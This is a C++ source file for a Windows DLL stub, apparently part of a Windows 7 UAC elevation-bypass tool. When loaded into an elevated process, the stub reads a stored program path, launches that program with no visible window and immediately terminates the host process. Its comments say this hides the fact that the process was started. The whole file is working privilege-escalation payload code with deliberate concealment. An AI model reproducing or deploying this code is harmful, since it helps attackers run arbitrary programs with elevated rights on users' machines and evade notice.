#include "stdafx.h"

#include <stdio.h>

#include ".\..\CMMN.h"

#include <stdlib.h>
#include <string>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	//
	//	Simple stub code that is used to create EXE within a alevated process.
	//	Wee need to hide fact that we've started process thats why we immediately
	//	Terminate host application.
	//
	CLogger::LogLine(TEXT("DLL: Hello"));

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			//
			//	Obtaining TIOR path to be used for CreateProcess call
			//
			std::wstring cmd;
			CInterprocessStorage::GetString( TEXT("w7e_TIORPath"), cmd );

			STARTUPINFO startupInfo = {0};
			startupInfo.cb = sizeof(startupInfo);
			PROCESS_INFORMATION processInfo = {0};

			CLogger::LogLine(TEXT("DLL: TIOR shell="));
			CLogger::LogLine(cmd);

			//
			//	Create not visible window
			//
			if (CreateProcess(cmd.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW * 1, NULL, NULL, &startupInfo, &processInfo))
			{
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}

			ExitProcess(-69);
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
